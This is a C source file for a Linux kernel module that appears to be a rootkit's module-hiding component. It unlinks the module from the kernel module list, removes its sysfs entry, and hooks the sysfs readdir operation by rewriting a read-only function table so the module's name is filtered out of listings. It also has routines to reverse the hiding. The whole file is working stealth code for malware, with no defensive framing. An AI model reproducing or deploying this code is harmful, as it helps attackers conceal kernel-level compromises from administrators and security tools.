#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/fs.h>
#include <linux/sysfs.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"
#include "hide_module.h"


/// sysfs stuff
typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);
fun_int_file_dirent_filldir_t original_sysfs_readdir;
filldir_t original_sysfs_filldir;

struct sysfs_dirent *this_module_dirent;

int hidden = 0;

int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
    if (strcmp(name, THIS_MODULE->name) == 0){
        OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
        return 0;
    }
    return original_sysfs_filldir(__buf, name, namelen, offset, ino, d_type);
}

int hooked_sysfs_readdir(struct file * filp, void* dirent, filldir_t filldir){
    OUR_DEBUG("Hooked sysfs_readdir.\n");
    original_sysfs_filldir = filldir;
    return original_sysfs_readdir(filp, dirent, hooked_sysfs_filldir);
}


void hook_sysfs(void){
    struct file_operations* sysfs_dir_ops;
    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
    original_sysfs_readdir = sysfs_dir_ops->readdir;
    make_page_writable((long unsigned int) sysfs_dir_ops);
    sysfs_dir_ops->readdir = hooked_sysfs_readdir;
    make_page_readonly((long unsigned int) sysfs_dir_ops);
}


/**
 * Taken from fs/sysfs/sysfs.h
 */
struct sysfs_elem_dir {
        struct kobject          *kobj;
        /* children list starts here and goes through sd->s_sibling */
        struct sysfs_dirent     *children;
};

struct sysfs_elem_symlink {
        struct sysfs_dirent     *target_sd;
};

struct sysfs_elem_attr {
        struct attribute        *attr;
        struct sysfs_open_dirent *open;
};

struct sysfs_elem_bin_attr {
        struct bin_attribute    *bin_attr;
        struct hlist_head       buffers;
};

struct sysfs_inode_attrs {
        struct iattr    ia_iattr;
        void            *ia_secdata;
        u32             ia_secdata_len;
};

struct sysfs_dirent {
        atomic_t                s_count;
        atomic_t                s_active;
        struct sysfs_dirent     *s_parent;
        struct sysfs_dirent     *s_sibling;
        const char              *s_name;

        union {
                struct sysfs_elem_dir           s_dir;
                struct sysfs_elem_symlink       s_symlink;
                struct sysfs_elem_attr          s_attr;
                struct sysfs_elem_bin_attr      s_bin_attr;
        };

        unsigned int            s_flags;
        ino_t                   s_ino;
        umode_t                 s_mode;
        struct sysfs_inode_attrs *s_iattr;
};

void remove_from_sysfs_list(void){
    struct module *mod = THIS_MODULE;
    struct sysfs_dirent *entry, *parent, *last;
    int count;
    // Get internal file descriptor of the module directory of sysfs
    entry = mod->mkobj.kobj.sd;
    parent = entry->s_parent;

    last = 0;
    for (entry = parent->s_dir.children; entry; entry = entry->s_sibling)
    {
        if(strcmp(entry->s_name, THIS_MODULE->name) == 0){
            this_module_dirent = entry;
            if(last == 0){
                parent->s_dir.children = entry->s_sibling;
            } else {
                last->s_sibling = entry->s_sibling;
            }
            break;
        }
        last = entry;
        //OUR_DEBUG("name: %s", entry->s_name);
    }

    count = 0;
    // Loop over all modules and count
    for (entry = parent->s_dir.children; entry; entry = entry->s_sibling)
    {
        count++;
    }
    OUR_DEBUG("count: %d", count);
}

void reinsert_to_sysfs_list(void){
    struct sysfs_dirent *parent, *entry;
    int count;

    parent = this_module_dirent->s_parent;
    this_module_dirent->s_sibling = parent->s_dir.children;
    parent->s_dir.children = this_module_dirent;

    count = 0;
    // Loop over all modules and count
    for (entry = parent->s_dir.children; entry; entry = entry->s_sibling)
    {
        count++;
    }
    OUR_DEBUG("count: %d", count);
}


void unhook_sysfs(void){
    struct file_operations* sysfs_dir_ops;
    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
    make_page_writable((long unsigned int) sysfs_dir_ops);
    sysfs_dir_ops->readdir = original_sysfs_readdir;
    make_page_readonly((long unsigned int) sysfs_dir_ops);
}

/*
 * Hiding a module is basically just removing it from the list of modules
 */
void hide_module(void)
{
    remove_from_sysfs_list();
    if(hidden == 1)
        return;
    list_del(&(THIS_MODULE->list));

    hidden = 1;
    hook_sysfs();
}


void unhide_module(void)
{
    reinsert_to_sysfs_list();
    if(hidden == 0)
        return;

    list_add(&(THIS_MODULE->list), (struct list_head *) ptr_modules);

    hidden = 0;
    unhook_sysfs();
}
